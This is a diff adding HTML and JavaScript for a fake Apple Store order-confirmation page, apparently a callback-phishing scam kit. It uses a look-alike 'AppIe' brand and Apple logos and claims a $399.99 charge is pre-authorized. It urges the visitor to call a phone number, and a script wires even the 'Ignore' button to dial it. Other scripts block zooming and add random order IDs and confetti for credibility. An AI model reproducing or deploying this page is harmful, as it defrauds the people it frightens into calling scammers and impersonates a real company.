+  <div class="nav-left">
+    <img src="lseen2.webp" alt="Menu" style="width:18px;height:auto;display:block;">
+    <img src="ee8e63hh.webp" alt="Apple Logo" style="width:18px;height:auto;display:block;position:relative;top:-3px;">
+    <span class="nav-title">Store</span>
+  </div>
+
+  <div class="nav-cart">
+    <svg width="22" height="22" viewBox="0 0 24 24" fill="none">
+      <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+      <line x1="3" y1="6" x2="21" y2="6" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round"/>
+      <path d="M16 10a4 4 0 01-8 0" stroke="#1d1d1f" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
+    </svg>
+  </div>
+</nav>
+
+<!-- Processing Screen -->
+<div id="processing">
+  <img src="3553gg3h.png" alt="Apple Logo" 
+       style="width:90px;height:auto;display:block;margin:0 auto 12px;">
+       
+  <p style="font-size:16px;color:#6e6e73;margin:0;">Powered by AppIe</p>
+  <p style="font-size:26px;font-weight:700;color:#1d1d1f;margin:4px 0 0;">Processing your order...</p>
+  <p style="font-size:16px;color:#6e6e73;margin:4px 0 0;">Please wait a moment</p>
+  
+  <div class="spinner"></div>
+</div>
+
+<!-- Confirmed Screen -->
+<div id="confirmed">
+
+  <div class="card">
+    <div class="card-header">
+      <div class="check-ring">
+        <svg width="24" height="24" viewBox="0 0 28 28" fill="none">
+          <polyline points="6,15 11,20 22,9" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+      </div>
+      <h1 style="font-size:clamp(17px,5vw,22px);font-weight:700;color:#1d1d1f;margin:0 0 2px;letter-spacing:-0.5px;">Order confirmed</h1>
+      <p style="font-size:clamp(11px,3vw,13px);color:#6e6e73;letter-spacing:-0.1px;">Thank you for your purchase</p>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="progress-wrap">
+      <div class="step">
+        <div class="dot done">✓</div>
+        <span class="step-lbl done">Placed</span>
+      </div>
+      <div class="step-line done"></div>
+      <div class="step">
+        <div class="dot active" style="font-size:clamp(13px,3.5vw,16px);">···</div>
+        <span class="step-lbl active">Preparing</span>
+      </div>
+      <div class="step-line pending"></div>
+      <div class="step">
+        <div class="dot pending">○</div>
+        <span class="step-lbl pending">Ready</span>
+      </div>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Order</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-id">#EB-000000</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Date</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;" id="order-date">—</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Item</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Store</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Amount</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">$399.99</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Payment mode</span>
+      <span style="font-size:clamp(16px,3vw,13px);font-weight:500;color:#1d1d1f;">Apple Wallet</span>
+    </div>
+    <div class="order-row">
+      <span style="font-size:clamp(16px,3vw,13px);color:#6e6e73;">Status (Paid)</span>
+      <span style="font-size:clamp(16px,2.8vw,12px);font-weight:500;color:#fff;background:#0071e3;padding:3px 10px;border-radius:20px;">Preparing</span>
+    </div>
+  </div>
+
+  <p class="sub-text">Pre-authorized transaction. No further action needed.</p>
+
+  <div class="alert-card">
+    <p style="font-size:clamp(16px,3vw,13px);color:#3a3000;line-height:1.55;margin:0 0 0;letter-spacing:-0.1px;">
+      ⚠ This amount will appear in your payment history within 24 hours.
+      If you did not place this order, please call support immediately.
+    </p>
+    <a class="btn-call" data-phone-tel>Call support: <span data-phone-display>+1(855) 397-2122</span></a>
+    <a class="btn-ignore" data-phone-tel>Ignore</a>
+  </div>
+
+</div>
+<canvas id="confetti"></canvas>	
+<script>
+  function generateOrderId() {
+    return '#EB-' + Math.floor(100000 + Math.random() * 900000);
+  }
+  function formatDate(d) {
+    var months = ['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'];
+    var h = d.getHours(), m = d.getMinutes(), ampm = h >= 12 ? 'PM' : 'AM';
+    h = h % 12 || 12;
+    return months[d.getMonth()] + ' ' + d.getDate() + ', ' + d.getFullYear() + ' ' +
+           h + ':' + (m < 10 ? '0'+m : m) + ' ' + ampm;
+  }
+  function launchConfetti() {
+    var canvas = document.getElementById('confetti');
+    var ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    var colors = ['#0071e3','#34c759','#ff9f0a','#ff375f','#bf5af2','#1d1d1f'];
+    var pieces = Array.from({length: 110}, function() {
+      return {
+        x: Math.random() * canvas.width,
+        y: -10 - Math.random() * 150,
+        w: 5 + Math.random() * 7,
+        h: 9 + Math.random() * 5,
+        color: colors[Math.floor(Math.random() * colors.length)],
+        rot: Math.random() * 360,
+        speed: 2.5 + Math.random() * 3,
+        drift: (Math.random() - 0.5) * 1.5,
+        spin: (Math.random() - 0.5) * 5
+      };
+    });
+    var frame = 0;
+    function draw() {
+      ctx.clearRect(0, 0, canvas.width, canvas.height);
+      pieces.forEach(function(p) {
+        ctx.save();
+        ctx.translate(p.x, p.y);
+        ctx.rotate(p.rot * Math.PI / 180);
+        ctx.fillStyle = p.color;
+        ctx.globalAlpha = 0.88;
+        ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+        ctx.restore();
+        p.y += p.speed; p.x += p.drift; p.rot += p.spin;
+      });
+      frame++;
+      if (frame < 200) requestAnimationFrame(draw);
+      else ctx.clearRect(0, 0, canvas.width, canvas.height);
+    }
+    draw();
+  }
+  setTimeout(function() {
+    document.getElementById('processing').style.display = 'none';
+    var c = document.getElementById('confirmed');
+    c.style.display = 'flex';
+    document.getElementById('order-id').textContent = generateOrderId();
+    document.getElementById('order-date').textContent = formatDate(new Date());
+    launchConfetti();
+  }, 2000);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>    
+
+<script>
+function closePopup() {
+    document.getElementById("paymentPopup").style.display = "none";
+}
+
+document.getElementById("paymentPopup").addEventListener(
+    "click",
+    function (event) {
+        if (event.target === this) {
+            closePopup();
+        }
+    }
+);
+</script>
+<script>
+  document.addEventListener('touchmove', function(e) {
+    if (e.touches.length > 1) e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturestart', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gesturechange', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+  document.addEventListener('gestureend', function(e) {
+    e.preventDefault();
+  }, { passive: false });
+</script>
+
+<!-- ============================================================= -->
+<!-- 🔧 AUTO-INJECT: appliesthe phone number to all tagged elements -->
+<!-- ============================================================= -->
+<script>
+(function() {
+  var cfg = window.SUPPORT_PHONE;
+
+  // 1) Update every element that shows the number as text
+  document.querySelectorAll('[data-phone-display]').forEach(function(el) {
+    el.textContent = cfg.display;
+  });
+
+  // 2) Update every element that should become a tel: link
+  document.querySelectorAll('[data-phone-tel]').forEach(function(el) {
+    // If it's a button → add click handler
+    if (el.tagName === 'BUTTON') {
+      el.addEventListener('click', function() {
+        window.location.href = 'tel:' + cfg.tel;
+      });
+    } else {
+      // If it's an <a> or anything else → set href
+      el.setAttribute('href', 'tel:' + cfg.tel);
+    }
+  });
 })();
 </script>
-<!--End of Tawk.to Script-->
 </body>
+
 </html>
